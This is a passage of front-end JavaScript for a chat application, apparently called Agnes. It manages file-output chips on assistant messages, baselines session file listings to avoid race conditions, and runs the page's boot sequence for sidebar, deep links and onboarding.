    return typeof f.path === "string" && f.path.startsWith(OUTPUTS_PREFIX);
  }

  // The baseline is established when the conversation OPENS. Deriving it
  // lazily from the first turn-end could not work: that listing is fetched
  // AFTER the turn ran, so the turn's own deliverable was already in the
  // baseline it seeded, and the first turn of a conversation — much the
  // commonest way to get a deliverable — could never auto-open the drawer.
  // Doing it here also retires the stale badge/rows a switch used to leave
  // behind.
  document.addEventListener("agnes:session-open", async (e) => {
    const detail = e.detail || {};
    const chatId = detail.chatId || currentChatId;
    if (!chatId) return;
    // A RE-open of the same conversation is not a switch. `ensureWsReady`
    // re-enters openSession whenever the socket is closed, so this fires
    // mid-turn on a reconnect — and folding the listing into the baseline
    // there would absorb a deliverable written while the socket was down as
    // "already seen", leaving the turn-end that follows with nothing fresh
    // and the drawer shut. Nothing about the conversation changed, and the
    // turn-end poll refreshes the view after every turn, so the honest
    // response to a reconnect is to do nothing at all.
    if (detail.switching === false && _filesSessionId === chatId && _baselineKnown) return;
    // Reset synchronously, before the round-trip: until it lands the badge
    // and any open drawer would otherwise still show the previous
    // conversation's count and rows, whose links carry the old chat id.
    const seq = ++_filesSeq;
    _filesSessionId = chatId;
    _knownOutputs = new Set();
    _baselineKnown = false;
    updateFilesBadge(0);
    if (drawerOpen() && filesListEl) {
      filesListEl.replaceChildren();
      setFilesStatus("Loading…");
    }
    const { files, truncated, supported, ok } = await fetchSessionFiles(chatId, { quiet: true });
    // A newer switch (or a turn-end baseline) landed while this was in
    // flight — that one owns the state now.
    if (!ok || seq !== _filesSeq || currentChatId !== chatId) return;
    _knownOutputs = new Set(files.filter(isDeliverable).map((f) => f.path));
    _baselineKnown = true;
    updateFilesBadge(files.length);
    if (drawerOpen()) renderFileList(chatId, files, truncated, supported);
  });

  document.addEventListener("agnes:turn-end", async () => {
    const chatId = currentChatId;
    if (!chatId) return;
    // Defensive only: agnes:session-open seeds the baseline for every
    // conversation before a turn can end in it. If some future path reaches a
    // turn-end with no baseline at all, re-seed rather than treat every
    // pre-existing file as new — a spurious auto-open on someone else's old
    // files is worse than one missed.
    if (_filesSessionId !== chatId || !_baselineKnown) {
      const seq = ++_filesSeq;
      const seed = await fetchSessionFiles(chatId, { quiet: true });
      // Same ok/ownership rules as the other two writers. Nothing is
      // assigned until the listing actually succeeds: claiming the session
      // with an empty baseline would make the NEXT turn read every
      // pre-existing file as fresh — the spurious auto-open this branch
      // exists to avoid — and would stop this branch from retrying.
      if (!seed.ok || seq !== _filesSeq || currentChatId !== chatId) return;
      _filesSessionId = chatId;
      _knownOutputs = new Set(seed.files.filter(isDeliverable).map((f) => f.path));
      _baselineKnown = true;
      updateFilesBadge(seed.files.length);
      return;
    }
    const seq = ++_filesSeq;
    const { files, truncated, supported, ok } = await fetchSessionFiles(chatId, { quiet: true });
    // Same in-flight guard as the seed above: a slower open-time fetch must
    // not overwrite this newer baseline, or the next turn re-reports these
    // same files as fresh.
    if (!ok || seq !== _filesSeq || currentChatId !== chatId) return;
    updateFilesBadge(files.length);
    const fresh = files.filter(isDeliverable).filter((f) => !_knownOutputs.has(f.path));
    _knownOutputs = new Set(files.filter(isDeliverable).map((f) => f.path));
    if (drawerOpen()) renderFileList(chatId, files, truncated, supported);
    if (!fresh.length) return;
    // The file belongs to the turn that made it, so it is delivered THERE —
    // as a chip on the answer, beside the sentence naming it — rather than by
    // throwing a panel over the conversation. The drawer stays reachable from
    // the header for everything the session has accumulated; it just stops
    // being the thing that interrupts the read.
    renderFileChips(chatId, fresh);
  });

  /** Attach file chips to the newest assistant bubble. Hovering (or focusing)
   *  a chip reveals its actions — the resting state stays a quiet mention of
   *  a filename, which is what most turns want. */
  function renderFileChips(chatId, files) {
    const articles = document.querySelectorAll("#chat-messages .msg-assistant");
    const bubble = articles.length
      ? articles[articles.length - 1].querySelector(".msg-bubble")
      : null;
    if (!bubble || !files.length) return;

    let row = bubble.querySelector(":scope > .cloud-chat-file-chips");
    if (!row) {
      row = document.createElement("div");
      row.className = "cloud-chat-file-chips";
      // Sit above the message-actions row, same seam renderNextActions uses,
      // so live and reloaded bubbles agree about the tail's order.
      const actionsRow = bubble.querySelector(":scope > .msg-actions");
      if (actionsRow) bubble.insertBefore(row, actionsRow);
      else bubble.appendChild(row);
    }

    for (const f of files) {
      if (row.querySelector(`[data-path="${CSS.escape(f.path)}"]`)) continue;
      row.appendChild(buildFileChip(chatId, f));
    }
  }

  function buildFileChip(chatId, f) {
    const chip = document.createElement("div");
    chip.className = "cloud-chat-file-chip";
    chip.dataset.path = f.path;

    const label = document.createElement("span");
    label.className = "cloud-chat-file-chip-label";
    // textContent — an agent chose this filename.
    label.textContent = f.name;
    label.title = f.path;

    const size = document.createElement("span");
    size.className = "cloud-chat-file-chip-size";
    size.textContent = fmtSize(f.size_bytes);

    const actions = document.createElement("div");
    actions.className = "cloud-chat-file-chip-actions";

    const dl = document.createElement("a");
    dl.className = "cloud-chat-file-chip-action";
    dl.textContent = "Download";
    dl.href =
      "/api/chat/sessions/" + encodeURIComponent(chatId) +
      "/files/download?path=" + encodeURIComponent(f.path);
    dl.setAttribute("download", f.name);

    const save = document.createElement("button");
    save.type = "button";
    save.className = "cloud-chat-file-chip-action";
    save.textContent = "Save to Library";
    save.addEventListener("click", () => saveChipToLibrary(chatId, f, save));

    actions.appendChild(dl);
    actions.appendChild(save);
    chip.appendChild(label);
    chip.appendChild(size);
    chip.appendChild(actions);
    return chip;
  }

  async function saveChipToLibrary(chatId, f, btn) {
    btn.disabled = true;
    btn.textContent = "Saving…";
    try {
      const res = await fetch(
        "/api/chat/sessions/" + encodeURIComponent(chatId) + "/files/save-artefact",
        {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ path: f.path }),
        }
      );
      if (!res.ok) throw new Error("HTTP " + res.status);
      const data = await res.json();
      const link = document.createElement("a");
      link.className = "cloud-chat-file-chip-action";
      link.textContent = "In Library ↗";
      link.href = data.library_url || "/library";
      link.target = "_blank";
      link.rel = "noopener";
      btn.replaceWith(link);
      showToast("Saved to your Library", "ok");
    } catch (err) {
      btn.disabled = false;
      btn.textContent = "Save to Library";
      showToast("Could not save to Library", "error");
    }
  }

})();

(async () => {
  renderCapabilities();
  wireSuggestionButtons();
  wireCopyTranscript();
  autosizeComposer();
  // Composer agent picker. Not awaited: the fetch behind it must never delay
  // the composer becoming usable, and it degrades to the brand label on
  // failure.
  initAgentPicker();
  // Rail pre-conversation Dashboard (no-op on topnav): greeting fix-up +
  // suggested-next-actions wiring, handed submitUserMessage/openSession so
  // every suggestion starts (or resumes) a conversation through the exact
  // same flow as a typed message.
  // `capabilities` is the same server-rendered snapshot renderCapabilities()
  // reads, passed in rather than re-parsed in the dashboard module so the page
  // has exactly one parser for that blob. The dashboard uses it to decide
  // which suggestions are honest: with no reachable tables, the four data
  // starters ("Compare revenue trends", …) would every one of them fail.
  initChatDashboard({
    submitPrompt: submitUserMessage,
    openSession,
    capabilities: readCapabilitySnapshot(),
  });
  // Pre-seeded question (/chat?q=… — the detail pages' "Ask Agnes" links):
  // prefill the composer and focus, but never auto-send — a GET must stay
  // side-effect free (a reload would otherwise re-create sessions).
  const _seededQ = new URLSearchParams(window.location.search).get("q");
  const _composer = $("chat-input");
  if (_seededQ && _composer && !_composer.value) {
    _composer.value = _seededQ;
    autosizeComposer();
    _composer.focus();
  } else if (_composer && $("rdb-actions")) {
    // Dashboard empty state — the Agnes input is the page's main affordance.
    _composer.focus();
  }
  // Sidebar list — a failed fetch must not break the page: the history list
  // shows its FAILED state (never the empty one — TCRD-207/DES-153), the
  // dashboard renders its suggestions without the personalized resume row
  // (partial data), and boot continues (deep links + onboarding still work).
  let _sidebarOk = true;
  try {
    await loadSidebar();
  } catch (_) {
    _sidebarOk = false;
    const empty = $("cloud-chat-empty-state");
    if (empty) empty.hidden = true;
    const failed = $("cloud-chat-failed-state");
    if (failed) {
      failed.hidden = false;
      const retryBtn = failed.querySelector("[data-state-retry]");
      if (retryBtn && !retryBtn._wired) {
        retryBtn._wired = true;
        retryBtn.addEventListener("click", () => loadSidebar().catch(() => {}));
      }
    }
  }
  updateDashboardSuggestions(_sidebarOk ? _sessionsCache : null);
  // Sidebar cache (_sessionsCache) is now populated so openSession can
  // resolve the title; fire the one-shot deep-link open. Captured BEFORE the
  // call: `_maybeOpenInitialSession` consumes `_initialSessionId` (nulls it)
  // synchronously but defers the actual `openSession` into a
  // `requestAnimationFrame` callback, so `currentChatId` below is not yet set
  // even when a session deep-link is about to open.
  const _hadInitialSession = !!_initialSessionId;
  _maybeOpenInitialSession();
  // `/chat?agent=<slug>` — the Chat button on an agent card. Spawns a session
  // running AS that agent. Skipped when a session deep-link already claimed
  // the page, since that names a specific existing conversation.
  const _agentSlug = _takeAgentSlugFromUrl();
  if (_agentSlug && !currentChatId && !_hadInitialSession) {
    hideCapabilities();
    newChat(_agentSlug).catch((err) => {
      console.error("chat: could not start a session as agent", err);
      if (window.appToast) {
        window.appToast({ kind: "error", msg: "Could not start a chat with that agent." });
      }
    });
  }
  // Chat-driven onboarding — render the journey panel and prime the greeting/
  // gap-resolver hooks. Best-effort: a failure here never blocks the chat.
  initChatOnboarding({
    renderAssistant: (md) => renderMessage({ role: "assistant", content: md }),
    appendNode: (el) => {
      const host = $("chat-messages");
      if (host) host.appendChild(el);
    },
    resubmit: (text) => submitUserMessage(text),
    scrollToBottom: () => maybeScrollToBottom(),
    // Unconditionally bring the newest message into view — used as a fallback
    // when maybeScrollToBottom() no-ops (user scrolled up, or the thread was
    // hidden behind the empty-state hero). chat.js owns #chat-messages.
    scrollLastIntoView: () =>
      $("chat-messages")?.lastElementChild?.scrollIntoView({ block: "end" }),
    revealConversation: () => hideCapabilities(),
  }).catch(() => {});
})();
